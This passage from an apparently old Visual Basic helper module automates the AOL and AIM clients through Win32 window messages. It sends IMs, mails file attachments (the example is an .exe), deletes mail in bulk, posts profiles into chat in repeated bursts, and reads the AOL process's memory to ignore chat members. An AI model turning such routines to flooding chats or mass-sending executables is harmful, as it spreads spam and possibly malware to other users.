                    LisB.AddItem Nam
                End If
            Next t

End Sub
Public Sub Aim_IM(Who As String, Wat As String)
Dim AimM As Long, tab1 As Long, ButM As Long, _
Osc As Long, but As Long, No As Long, Edi As Long, _
Ate1 As Long, Ate2 As Long, AThere As Long, buf As String, _
ATLen As Long, Aim As Long

'''''CHECK IF IM EXISTS
AThere& = FindWindow("AIM_IMessage", vbNullString)
ATLen& = GetWindowTextLength(AThere&)
buf$ = String$(200, 0)
Call GetWindowText(AThere&, buf$, (ATLen& + 1))
If InStr(LCase(LTrim(RTrim(buf$))), (LCase(Who) & " - instant message")) <> 0 Then
        Ate1& = FindWindowEx(AThere&, 0&, "WndAte32class", vbNullString)
        Ate1& = GetWindow(Ate1&, GW_HWNDNEXT)
        Ate2& = FindWindowEx(Ate1&, 0&, "Ate32Class", vbNullString)
        but& = FindWindowEx(AThere&, 0&, "_Oscar_IconBtn", vbNullString)
        Call SendMessageByString(Ate2&, WM_SETTEXT, 0, Wat)
        Call ClickButton(but&)
Else
        AimM& = FindWindow("_Oscar_BuddyListWin", vbNullString)
        tab1& = FindWindowEx(AimM&, 0&, "_Oscar_TabGroup", vbNullString)
        ButM& = FindWindowEx(tab1&, 0&, "_Oscar_IconBtn", vbNullString)
            If AimM& <> 0 And ButM& <> 0 Then
                Call ClickButton(ButM&)
            End If
Do: DoEvents
Aim& = FindWindow("AIM_IMessage", vbNullString)
Osc& = FindWindowEx(Aim&, 0&, "_Oscar_PersistantCombo", vbNullString)
Edi& = FindWindowEx(Osc&, 0&, "Edit", vbNullString)
Ate1& = FindWindowEx(Aim&, 0&, "WndAte32class", vbNullString)
Ate1& = GetWindow(Ate1&, GW_HWNDNEXT)
Ate2& = FindWindowEx(Ate1&, 0&, "Ate32Class", vbNullString)
but& = FindWindowEx(Aim&, 0&, "_Oscar_IconBtn", vbNullString)
If Aim& <> 0 And Ate2& <> 0 And Ate1& <> 0 And but& <> 0 Then Exit Do
Loop

Call SendMessageByString(Edi&, WM_SETTEXT, 0, Who)
Call SendMessageByString(Ate2&, WM_SETTEXT, 0, Wat)
Call ClickButton(but&)
End If

Wait (0.5)
No& = FindWindow("#32770", "Information")
If No& <> 0 Then
Call SendMessage(No&, WM_CLOSE, 0, 0&)
Call SendMessage(Aim&, WM_CLOSE, 0, 0&)
End If

End Sub


Public Sub ChatToListbox(Lis As ListBox)
Dim chil As Long, Rich As Long, sendnum, GeText$, last, l$, Lne$, _
X As Integer, GeTxt As String

chil& = FindChat
Rich& = FindWindowEx(chil&, 0&, "RICHCNTL", vbNullString)
 
sendnum = SendMessageByNum(Rich&, 14, 0&, 0&)
GeTxt$ = Space$(sendnum)
Call SendMessageByString(Rich&, 13, sendnum + 1, GeTxt$)
For X = 1 To Len(GeTxt$)
 l$ = Mid(GeTxt$, X, 1)
  If l$ = Chr(13) Then
 Let l$ = ""
 Lis.AddItem Lne$
 Lne$ = ""
 End If
 Lne$ = Lne$ & l$
 Next X
 
End Sub

Public Sub Object_MoveUp(Obj)
'put this in a timer with a low interval
'object is like a label or pic box
Obj.Top = Val(Obj.Top) + 20
End Sub
Public Sub Object_MoveDown(Obj)
'put this in a timer with a low interval
'object is like a label or pic box
Obj.Top = Val(Obj.Top) - 20
End Sub

Public Function Print_GetDeviceName()
'gets the name of the printer
Dim name As String
name = Printer.DeviceName
Print_GetDeviceName = name
End Function
Public Sub SendMailAttach(Who As String, subject As String, message As String, FilePath As String)
'example  .. Call AOL_MailAttach("user123","hi","hey whats up","c:\example.exe")
On Local Error Resume Next
Dim aol As Long, tool As Long, ToolB As Long, icona As Long, _
mdi As Long, Tit As Long, Edi As Long, Rich As Long, chil As Long, _
n As Integer, i As Integer, Mod2 As Long, Tree2 As Long, IconB As Long, _
fle As Long, edif As Long, but As Long, Stat As Long, FLen As Integer
DoEvents
FLen = FileLen(FilePath)
If FLen = 0 Or Err Then
    MsgBox ("Invalid file or file path error."), vbCritical, ("Error")
    Exit Sub
End If

aol& = FindWindow("AOL Frame25", vbNullString)
tool& = FindWindowEx(aol&, 0&, "AOL Toolbar", vbNullString)
ToolB& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
icona& = FindWindowEx(ToolB&, 0&, "_AOL_Icon", vbNullString)
icona& = GetWindow(icona&, 2)
Call ClickButton(icona&)

Do: DoEvents
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Write Mail")
Edi& = FindWindowEx(Tit&, 0&, "_AOL_Edit", vbNullString)
Rich& = FindWindowEx(Tit&, 0&, "RICHCNTL", vbNullString)
If Tit& <> 0 And Edi& <> 0 And Rich& <> 0 Then Exit Do
Loop
Call SendMessageByString(Edi&, WM_SETTEXT, 0, Who)
    For n = 1 To 4
        Edi& = GetWindow(Edi&, GW_HWNDNEXT)
    Next n
Call SendMessageByString(Edi&, WM_SETTEXT, 0, subject)
Call SendMessageByString(Rich&, WM_SETTEXT, 0, message)
 Dim gnum As Integer
        If Aol_Version = "4" Then
            gnum = 22
        Else
            gnum = 24
        End If
Wait (0.4)
    For i = 1 To gnum
        Edi& = GetWindow(Edi&, GW_HWNDNEXT)
    Next i


Rich& = GetWindow(Rich&, GW_HWNDNEXT)
Rich& = GetWindow(Rich&, GW_HWNDNEXT)

Call ClickButton(Rich&)

Wait (0.3)

Do: DoEvents
Mod2& = FindWindow("_AOL_Modal", vbNullString)
Tree2& = FindWindowEx(Mod2&, 0&, "_AOL_Tree", vbNullString)
Stat& = FindWindowEx(Mod2&, 0&, "_AOL_Static", vbNullString)
IconB& = FindWindowEx(Mod2&, 0&, "_AOL_Icon", vbNullString)
If Mod2& <> 0 And Tree2& <> 0 And Stat& <> 0 And IconB& <> 0 Then Exit Do
Loop

Call ClickButton(IconB&)

Wait (0.3)
Do: DoEvents
fle& = FindWindow("#32770", vbNullString)
edif& = FindWindowEx(fle&, 0&, "Edit", vbNullString)
but& = FindWindowEx(fle&, 0&, "Button", vbNullString)
If fle& <> 0 And edif& <> 0 And but& <> 0 Then Exit Do
Loop
Wait (0.3)
Call SendMessageByString(edif&, WM_SETTEXT, 0, FilePath)
but& = GetWindow(but&, GW_HWNDNEXT)
Call ClickButton(but&)

Wait (0.2)
Do: DoEvents
Mod2& = FindWindow("_AOL_Modal", vbNullString)
Tree2& = FindWindowEx(Mod2&, 0&, "_AOL_Tree", vbNullString)
Stat& = FindWindowEx(Mod2&, 0&, "_AOL_Static", vbNullString)
IconB& = FindWindowEx(Mod2&, 0&, "_AOL_Icon", vbNullString)
If Mod2& <> 0 And Tree2& <> 0 And Stat& <> 0 And IconB& <> 0 Then Exit Do
Loop
Wait (0.2)
IconB& = GetWindow(IconB&, GW_HWNDNEXT) 'detach
    IconB& = GetWindow(IconB&, GW_HWNDNEXT) 'OK

Call ClickButton(IconB&)
Wait (0.2)
Call ClickButton(Edi&)



End Sub
Public Sub SendMailAttach2(Who As String, subject As String, message As String, FilePath As String)
'example  .. Call AOL_MailAttach("user123","hi","hey whats up","c:\example.exe")
'this sub will wait untill the mail has finished sending
'then it will close the file transfer done message
'use this if you want to do something only after the transfer
'is done, such as send to chat that the file is done...
On Local Error Resume Next
Dim aol As Long, tool As Long, ToolB As Long, icona As Long, _
mdi As Long, Tit As Long, Edi As Long, Rich As Long, chil As Long, _
n As Integer, i As Integer, Mod2 As Long, Tree2 As Long, IconB As Long, _
fle As Long, edif As Long, but As Long, Stat As Long, FLen As Integer
DoEvents
FLen = FileLen(FilePath)
If FLen = 0 Or Err Then
    MsgBox ("Invalid file or file path error."), vbCritical, ("Error")
    Exit Sub
End If

aol& = FindWindow("AOL Frame25", vbNullString)
tool& = FindWindowEx(aol&, 0&, "AOL Toolbar", vbNullString)
ToolB& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
icona& = FindWindowEx(ToolB&, 0&, "_AOL_Icon", vbNullString)
icona& = GetWindow(icona&, 2)
Call ClickButton(icona&)

Do: DoEvents
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Write Mail")
Edi& = FindWindowEx(Tit&, 0&, "_AOL_Edit", vbNullString)
Rich& = FindWindowEx(Tit&, 0&, "RICHCNTL", vbNullString)
If Tit& <> 0 And Edi& <> 0 And Rich& <> 0 Then Exit Do
Loop
Call SendMessageByString(Edi&, WM_SETTEXT, 0, Who)

    For n = 1 To 4
        Edi& = GetWindow(Edi&, GW_HWNDNEXT)
    Next n
Call SendMessageByString(Edi&, WM_SETTEXT, 0, subject)
Call SendMessageByString(Rich&, WM_SETTEXT, 0, message)
 Dim gnum As Integer
        If Aol_Version = "4" Then
            gnum = 22
        Else
            gnum = 24
        End If
Wait (0.4)
    For i = 1 To gnum
        Edi& = GetWindow(Edi&, GW_HWNDNEXT)
    Next i


Rich& = GetWindow(Rich&, GW_HWNDNEXT)
Rich& = GetWindow(Rich&, GW_HWNDNEXT)

Call ClickButton(Rich&)

Wait (0.3)

Do: DoEvents
Mod2& = FindWindow("_AOL_Modal", vbNullString)
Tree2& = FindWindowEx(Mod2&, 0&, "_AOL_Tree", vbNullString)
Stat& = FindWindowEx(Mod2&, 0&, "_AOL_Static", vbNullString)
IconB& = FindWindowEx(Mod2&, 0&, "_AOL_Icon", vbNullString)
If Mod2& <> 0 And Tree2& <> 0 And Stat& <> 0 And IconB& <> 0 Then Exit Do
Loop

Call ClickButton(IconB&)

Wait (0.3)
Do: DoEvents
fle& = FindWindow("#32770", vbNullString)
edif& = FindWindowEx(fle&, 0&, "Edit", vbNullString)
but& = FindWindowEx(fle&, 0&, "Button", vbNullString)
If fle& <> 0 And edif& <> 0 And but& <> 0 Then Exit Do
Loop
Wait (0.3)
Call SendMessageByString(edif&, WM_SETTEXT, 0, FilePath)
but& = GetWindow(but&, GW_HWNDNEXT)
Call ClickButton(but&)

Wait (0.2)
Do: DoEvents
Mod2& = FindWindow("_AOL_Modal", vbNullString)
Tree2& = FindWindowEx(Mod2&, 0&, "_AOL_Tree", vbNullString)
Stat& = FindWindowEx(Mod2&, 0&, "_AOL_Static", vbNullString)
IconB& = FindWindowEx(Mod2&, 0&, "_AOL_Icon", vbNullString)
If Mod2& <> 0 And Tree2& <> 0 And Stat& <> 0 And IconB& <> 0 Then Exit Do
Loop
Wait (0.2)
IconB& = GetWindow(IconB&, GW_HWNDNEXT) 'detach
    IconB& = GetWindow(IconB&, GW_HWNDNEXT) 'OK

Call ClickButton(IconB&)
Wait (0.2)
Call ClickButton(Edi&)

Call Modal_StaticWait("File Transfer Complete")

End Sub

Public Sub AntiIdle()
'put in timer
Dim Modal As Long, There As Integer, There2 As Integer, txt$
Modal& = FindWindow("_AOL_Modal", vbNullString)
txt$ = Modal_Static
There = InStr(txt$, " stay online")
There2 = InStr(txt$, " have been idle")
If Modal& <> 0 And There <> 0 Or There2 <> 0 Then
Call SendMessage(Modal&, WM_CLOSE, 0, 0&)
End If

End Sub

Public Sub ChatColorSend(color As String, strin As String)
'color constants: (L before color = light, D = Dark)
'Blue
'LBlue
'DBlue
'Green
'LGreen
'DGreen
'Red
'DRed
'Yellow
'Grey
'LGrey
'DGrey
'Orange
'Purple
'Pink
' Ex.. Call ChatColorSend(Blue,text1.text)
Dim CC$
CC$ = "<Font Color=" & Chr(34) & color & Chr(34) & ">"
Call ChatSend(CC$ & strin)
End Sub

Public Sub NewMailToList(Lis As ListBox)
Dim aol As Long, mdi As Long, chil As Long, Tit As Long, _
tab1 As Long, tab2 As Long, tab3 As Long, tree As Long, _
coun As Long, Lent As Long, mail As String, NoName As String, _
X As Integer, l As String

aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, " Online Mailbox")
tab1& = FindWindowEx(Tit&, 0&, "_AOL_TabControl", vbNullString)
tab2& = FindWindowEx(tab1&, 0&, "_AOL_TabPage", vbNullString)
tree& = FindWindowEx(tab2&, 0&, "_AOL_Tree", vbNullString)
coun& = SendMessage(tree&, LB_GETCOUNT, 0, 0&)
Dim i As Integer
For i = 0 To coun& - 1
Lent& = SendMessage(tree&, LB_GETTEXTLEN, i, 0&)
    mail$ = String(Lent& + 1, 0)
    Call SendMessageByString(tree&, LB_GETTEXT, i, mail$)
    For X = 1 To Len(mail$)
        l$ = Mid(mail$, X, 1)
        NoName$ = NoName$ & l$
            If l$ = Chr(9) Then
                Let l$ = "": NoName$ = ""
            End If
    Next X
    
Lis.AddItem NoName$
    Next i
End Sub









Public Function CharToChr(Letter As String) As Integer
Dim c As Integer
c = Asc(Letter)

CharToChr = c

End Function


Public Function GetProfile(Nam As String)
Dim Edi As Long, mdi As Long, Tit As Long, icona As Long, _
none As Long, Tit2 As Long, View As Long, NewNum, Snum, _
last, Trm$, Prof$, chil As Long, aol As Long

Call RunAOLMenu(10, 2)
Do: DoEvents
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Get A Member's Profile")
Edi& = FindWindowEx(Tit&, 0&, "_AOL_Edit", vbNullString)
icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
If Edi& <> 0 And icona& <> 0 Then Exit Do
Loop
Call SendMessageByString(Edi&, WM_SETTEXT, 0, Nam)
DoEvents
Call ClickButton(icona&)
Wait (0.6)
none& = FindWindow("#32770", vbNullString)

If none& <> 0 Then
Call SendMessage(none&, WM_CLOSE, 0, 0&)
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
GetProfile = "No Profile"
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
Exit Function
End If
Do: DoEvents
Tit2& = FindChildByTitle(mdi&, chil&, "Member Profile")
View& = FindWindowEx(Tit2&, 0&, "RICHCNTL", vbNullString)
If Tit2& <> 0 And View& <> 0 Then Exit Do
Loop

Do: DoEvents
NewNum = Snum 'wait for all text to load up
Snum = SendMessageByNum(View&, 14, 0&, 0&)
Wait (0.3)
If NewNum = Snum Then Exit Do
Loop
Wait (0.5) 'make sure
Trm$ = Space$(Snum)
last = SendMessageByString(View&, 13, Snum + 1, Trm$)

Call SendMessage(Tit2&, WM_CLOSE, 0, 0&)
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)

Prof$ = Trm$
GetProfile = Prof$

End Function
Public Sub Label_Space(Lab As Label, txt As String, MaxSize As Integer)
Lab.FontSize = 1
Lab.AutoSize = True
Lab.Alignment = 2
Lab.Caption = txt
Dim X As Integer, i As Integer
For X = 1 To MaxSize Step 10
Lab.FontSize = X
Wait (0.001)
Next X
Wait (0.5)
For i = MaxSize To 1 Step -10
Lab.FontSize = i
Wait (0.001)
Next i

End Sub

Public Function IM_GetLastLine()
Dim IM$
Dim i$, txt$
Dim X As Integer
IM$ = IM_GetText

For X = 1 To Len(IM$)
i$ = Mid(IM$, X, 1)
txt$ = txt$ & i$
If i$ = Chr(9) Then
Let i$ = ""
txt$ = ""
End If


Next X
IM_GetLastLine = txt$
End Function

Public Sub MailNewDeleteAllBut(Sname As String)
'deletes all mail except from the name you put
Dim aol As Long, mdi As Long, Tit As Long, chil As Long, _
tab1 As Long, tab2 As Long, tree As Long, icona As Long, _
coun As Long, n As Integer, X As Integer, i As Integer, _
safety As Integer, Lent As Long, mail As String, c As String, _
news As String, l As Integer, news2 As String

Call Mail_OpenNew
Wait (0.5)
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, " Online Mailbox")
tab1& = FindWindowEx(Tit&, 0&, "_AOL_TabControl", vbNullString)
tab2& = FindWindowEx(tab1&, 0&, "_AOL_TabPage", vbNullString)
tree& = FindWindowEx(tab2&, 0&, "_AOL_Tree", vbNullString)
icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
        For n = 1 To 6
            icona& = GetWindow(icona&, GW_HWNDNEXT)
        Next n
 coun& = SendMessage(tree&, LB_GETCOUNT, 0, 0&)
For safety = 1 To 4
For i = 0 To coun& - 1
Lent& = SendMessage(tree&, LB_GETTEXTLEN, i, 0&)
    mail$ = String(Lent& + 1, 0)
    Call SendMessageByString(tree&, LB_GETTEXT, i, mail$)
            For X = 1 To Len(mail$)
                c$ = Mid(mail$, X, 1)
                    If c$ = Chr(9) Then
                    Let c$ = ""
                    Exit For
                    End If
                news$ = news$ & c$
                Next X
                        For l = X + 1 To Len(mail$)
                                c$ = Mid(mail$, l, 1)
                                    If c$ = Chr(9) Then
                                Let c$ = ""
                                     Exit For
                                End If
                            news2$ = news2$ & c$
                         Next l
               
        If LCase(news2$) <> LCase(Sname) Then
        Call SendMessage(tree&, LB_SETCURSEL, i, 0&)
        Call ClickButton(icona&)
        coun& = coun& - 1
        End If
        news2$ = ""
    Next i
    Next safety
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
End Sub

Public Sub MailNewDeleteNonAOL()
'this will delete all mails with more then 10
'letters , obviouslly getting rid of non aol
'unless the person actually writes @aol.com
'but thats usually junk anyway
Dim aol As Long, mdi As Long, Tit As Long, chil As Long, _
tab1 As Long, tab2 As Long, tree As Long, icona As Long, _
coun As Long, n As Integer, X As Integer, i As Integer, _
safety As Integer, Lent As Long, mail As String, c As String, _
news As String, l As Integer, news2 As String


Call Mail_OpenNew
Wait (0.5)
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, " Online Mailbox")
tab1& = FindWindowEx(Tit&, 0&, "_AOL_TabControl", vbNullString)
tab2& = FindWindowEx(tab1&, 0&, "_AOL_TabPage", vbNullString)
tree& = FindWindowEx(tab2&, 0&, "_AOL_Tree", vbNullString)
icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
        For n = 1 To 6
            icona& = GetWindow(icona&, GW_HWNDNEXT)
        Next n
 coun& = SendMessage(tree&, LB_GETCOUNT, 0, 0&)
For safety = 1 To 4
For i = 0 To coun& - 1
Lent& = SendMessage(tree&, LB_GETTEXTLEN, i, 0&)
    mail$ = String(Lent& + 1, 0)
    Call SendMessageByString(tree&, LB_GETTEXT, i, mail$)
            For X = 1 To Len(mail$)
                c$ = Mid(mail$, X, 1)
                    If c$ = Chr(9) Then
                    Let c$ = ""
                    Exit For
                    End If
                news$ = news$ & c$
                Next X
                        For l = X + 1 To Len(mail$)
                                c$ = Mid(mail$, l, 1)
                                    If c$ = Chr(9) Then
                                Let c$ = ""
                                     Exit For
                                End If
                            news2$ = news2$ & c$
                         Next l
               
        If InStr(news2$, "@") <> 0 Then
        Call SendMessage(tree&, LB_SETCURSEL, i, 0&)
        Call ClickButton(icona&)
        coun& = coun& - 1
        End If
        news2$ = ""
    Next i
    Next safety
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)

End Sub
Public Function Modal_Static()
Dim Modal As Long, Stat As Long, _
SPBuffa As String, last As String, sendnum
Modal& = FindWindow("_AOL_Modal", vbNullString)
Stat& = FindWindowEx(Modal&, 0&, "_AOL_Static", vbNullString)

sendnum = SendMessageByNum(Stat&, 14, 0&, 0&)
SPBuffa$ = Space$(sendnum)
last = SendMessageByString(Stat&, 13, sendnum + 1, SPBuffa$)
Modal_Static = SPBuffa$
End Function

Public Function Modal_StaticWait(StatT As String)
Dim Modal As Long, IconC As Long, Stat As Long, _
SPBuffa As String, last As String, sendnum
Do: DoEvents
Modal& = FindWindow("_AOL_Modal", vbNullString)
Stat& = FindWindowEx(Modal&, 0&, "_AOL_Static", vbNullString)
IconC& = FindWindowEx(Modal&, 0&, "_AOL_Icon", vbNullString)
sendnum = SendMessageByNum(Stat&, 14, 0&, 0&)
SPBuffa$ = Space$(sendnum)
last = SendMessageByString(Stat&, 13, sendnum + 1, SPBuffa$)
If InStr(LCase(SPBuffa$), LCase(StatT$)) <> 0 Then Exit Do
Loop
Call ClickButton(IconC&)

End Function


Public Sub RunMenuByChar(IconNum As Integer, Letter As String)
'it DOES have some bugs but for most windows
'itll work , if you wanna use it take the icon number
'and subtract one so if its the 9'th icon use 8
Dim aol As Long, tool As Long, ToolB As Long, _
icona As Long, i As Integer, Chng As String
aol& = FindWindow("AOL Frame25", vbNullString)
tool& = FindWindowEx(aol&, 0&, "AOL Toolbar", vbNullString)
ToolB& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
icona& = FindWindowEx(ToolB&, 0&, "_AOL_Icon", vbNullString)

For i = 1 To IconNum
icona& = GetWindow(icona&, GW_HWNDNEXT)
Next i
    DoEvents
        Chng$ = CharToChr(Letter)

            Call SendMessageByString(icona&, WM_CHAR, Chng$, 0&)

End Sub


Public Sub ScrollProfile(Sname As String)
'this one makes the Member Name: and catagories in blue
'looks a lot better
On Error Resume Next
Dim n As Integer, NumB As Long, Prof As String, _
X As Integer, i As String, fnt As String, j As String, _
o As Integer, Lne As String, Wat As String, Half As String, Hld As String
Dim cnt As Integer
cnt = 1
Prof$ = GetProfile(Sname)
Wait (0.4)
    If LCase(Prof$) = "no profile" Then
        Call ChatSend("No Profile")
        Exit Sub
    End If

DoEvents
For X = 1 To Len(Prof$)
i$ = Mid(Prof$, X, 1)

If i$ = Chr(13) Then
        Half$ = "<Font Color=" & Chr(34) & "#0000FF" & Chr(34) & ">" & Mid(Wat$, 1, InStr(Wat$, Chr(9)))
        Lne$ = "<Font Color=" & Chr(34) & "#000000" & Chr(34) & ">" & Mid(Wat$, InStr(Wat$, Chr(9)) + 1, Len(Wat$))
        Hld$ = Half$ & Lne$
        If Len(Hld$) > 92 Then
            While Len(Hld$) > 92
                Half$ = Mid(Hld$, 1, 91)
                Hld$ = Mid(Hld$, 92, Len(Hld$))
                Call ChatSend(Half$)
                Wait (0.6)
            Wend
                If Len(Hld$) > 0 Then
                    Call ChatSend(Hld$)
                    Wait (0.6)
                End If
        Else
            Call ChatSend(Hld$)

        End If
        
            Wat$ = "": Half$ = ""
            Lne$ = "": i$ = ""
            Wait (0.6)
Else
    Wat$ = Wat$ & i$
End If

Next X


End Sub



Public Sub FocusSet(win As Long)
Call SetFocusAPI(win)

End Sub














Public Sub ClipBoardCopy(txt As String)
Clipboard.Clear
Clipboard.SetText txt
End Sub
Public Function ClipBoardGetText()
'gets text from clipboard to paste use this:
'text1.text = text1.text & ClipBoardGetText
Dim txt$
txt$ = Clipboard.GetText
ClipBoardGetText = txt$
End Function

Public Function TextBoxSelectedText(txt As TextBox)
'returns the text thats highlighted in a textbox
Dim st As String
st$ = txt.SelText
TextBoxSelectedText = st$
End Function
Public Sub TextBoxTypewriter(Wat As String, txt As TextBox)
'makes text "type" up
Dim i As Integer, l As String
For i = 1 To Len(Wat)
l$ = Mid(Wat, 1, i)
txt.Text = l$
Wait (0.2)
Next i
End Sub
Public Sub TextBoxFastTypewriter(Wat As String, txt As TextBox)
'makes text "type" up faster
Dim i As Integer, l As String
For i = 1 To Len(Wat)
l$ = Mid(Wat, 1, i)
txt.Text = l$
Wait (0.1)
Next i
End Sub
Public Sub LabelTypewriter(Wat As String, Lab As Label)
'makes text "type" up
Dim i As Integer, l As String
For i = 1 To Len(Wat)
l$ = Mid(Wat, 1, i)
Lab.Caption = l$
Wait (0.2)
Next i
End Sub
Public Sub LabelFastTypewriter(Wat As String, Lab As Label)
'makes text "type" up faster
Dim i As Integer, l As String
For i = 1 To Len(Wat)
l$ = Mid(Wat, 1, i)
Lab.Caption = l$
Wait (0.1)
Next i
End Sub

Public Sub UnUpchat()
Dim moda As Long, Stat As Integer
moda& = FindWindow("_AOL_Modal", vbNullString)
Stat = InStr(Modal_Static, "Now Uploading")

If moda& <> 0 And Stat <> 0 Then
Call ShowWindow(moda&, SW_SHOW)
Call ShowWindow(moda&, SW_RESTORE)
End If
End Sub

Public Sub Upchat()
Dim moda As Long, Stat As Integer
moda& = FindWindow("_AOL_Modal", vbNullString)
Stat = InStr(Modal_Static, "Now Uploading")

If moda& <> 0 And Stat <> 0 Then
Call ShowWindow(moda&, SW_HIDE)
Call ShowWindow(moda&, SW_MINIMIZE)
End If
Call AOL_SetFocus
End Sub

Public Sub WaitForInRoom()
Do: DoEvents
If InRoom = True Then Exit Do
Loop

End Sub

Public Sub WaitForMenu()
Dim Drp As Long, win As Long
Do: DoEvents
Drp& = FindWindow("#32768", vbNullString)
win& = IsWindowVisible(Drp&)
Loop Until win& = 1
End Sub


Public Sub Window_Hide(WinHandle)
Call ShowWindow(WinHandle, SW_HIDE)

End Sub
Public Sub Window_Show(WinHandle)
Call ShowWindow(WinHandle, SW_SHOW)

End Sub
Public Sub Window_Close(WinHandle)
Call SendMessage(WinHandle, WM_CLOSE, 0, 0&)

End Sub

Public Function Windows_GetUser()
'returns the name of the user in windows
     
     Dim Spcs As String
     Dim Lent As Long
     Spcs = Space$(255)
     Lent = Len(Spcs)
     Call GetUserName(Spcs, Lent)

    If Lent > 0 Then
         Windows_GetUser = Left$(Spcs, Lent)
    Else
         Windows_GetUser = vbNullString
    End If

    End Function








Public Sub ToImKill()
'kills the im that comes up when you im someone
Dim aol As Long, mdi As Long, chil As Long
Dim Tit As Long
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, " Instant Message To:")
If Tit& <> 0 Then
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
End If

End Sub





Public Sub FreeProcess()
Dim Proc As Integer
Do: DoEvents
Proc = Proc + 1
DoEvents
If Proc = 50 Then Exit Do
Loop
End Sub

Public Sub List_RemoveName(Lis As ListBox, Nam As String)
Dim i As Integer, item$

For i = 0 To Lis.ListCount - 1
    item$ = LCase(Lis.List(i))
    If item$ = LCase(Nam) Then
        Lis.RemoveItem i
    End If
Next i
End Sub
Public Sub Playwav(File As String)
Dim FileName As String
FileName$ = File
Call sndPlaySound(FileName$, SND_ASYNC)
End Sub
Public Sub PlayWavLoop(File As String)
Dim FileName As String
FileName$ = File
Call sndPlaySound(FileName$, SND_ASYNC Or SND_LOOP)

End Sub
Public Sub AddRoom(LisB As ListBox)
Dim chil As Long, Rich As Long, Lis As Long
Dim i As Integer

chil& = FindChat
Rich& = FindWindowEx(chil&, 0&, "RICHCNTL", vbNullString)
Lis& = FindWindowEx(chil&, 0&, "_AOL_Listbox", vbNullString)

Call ReadProcess2Array(Lis&)

For i = 0 To SizeOfPA
If Not (ProcessArray(i) = GetUserSn) Then
LisB.AddItem ProcessArray(i)
End If

Next i
End Sub

Public Sub ChatIgnore(InsName As String)
On Error Resume Next
Dim AProc As Long, holdit As Long, Person As String
Dim HoldThem As Long, Howmnybts As Long, chil As Long, Rich As Long
Dim Lis As Long, GetIt As Long, Edi As Long, MakeSure As Integer
Dim aol As Long, mdi As Long, AolThread, AolProcessThread
Dim chk As Long, Tit As Long, i As Integer

aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindChat
Rich& = FindWindowEx(chil&, 0&, "RICHCNTL", vbNullString)
Lis& = FindWindowEx(chil&, 0&, "_AOL_Listbox", vbNullString)


AolThread = GetWindowThreadProcessId(Lis&, AProc)
AolProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AProc)

If AolProcessThread Then
For i = 0 To SendMessage(Lis&, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
holdit = SendMessage(Lis&, LB_GETITEMDATA, ByVal CLng(i), ByVal 0&)
holdit = holdit + 24
Call ReadProcessMemory(AolProcessThread, holdit, Person$, 4, Howmnybts)
                        
Call RtlMoveMemory(HoldThem, ByVal Person$, 4)
HoldThem = HoldThem + 6

Person$ = String$(20, vbNullChar)
Call ReadProcessMemory(AolProcessThread, HoldThem, Person$, Len(Person$), Howmnybts)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If InStr(LCase(Person$), LCase(InsName)) <> 0 And InStr(LCase(GetUserSn), LCase(InsName)) = 0 Then
Call SendMessage(Lis&, LB_SETCURSEL, i, 0&)
Call SendMessage(Lis&, WM_LBUTTONDBLCLK, 0, 0&)
    Do: DoEvents
        Tit& = FindChildByTitle(mdi&, chil&, Person$)
            chk& = FindWindowEx(Tit&, 0&, "_AOL_Checkbox", vbNullString)
        If Tit& <> 0 And chk& <> 0 Then Exit Do
    Loop

            Do: DoEvents
                Call ClickButton(chk&)
                        GetIt& = SendMessage(chk&, BM_GETCHECK, 0, 0&)
                        If GetIt& = 1 Then Exit Do
                        Loop
                    Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
                    Exit For
            End If
Next i
Call CloseHandle(AolProcessThread)
Wait (0.3)
DoEvents
If InStr(LCase(Person$), LCase(InsName)) <> 0 Then
    IgnoreStat = True
    InsName = Person$ 'Returns actual name for chat sending purposes
ElseIf LCase(Person$) = LCase(InsName) Then
    IgnoreStat = False
Else
    IgnoreStat = False
End If

End If
End Sub


Public Sub ChatUnIgnore(InsName As String)
On Error Resume Next

Dim AProc As Long, holdit As Long, Person As String
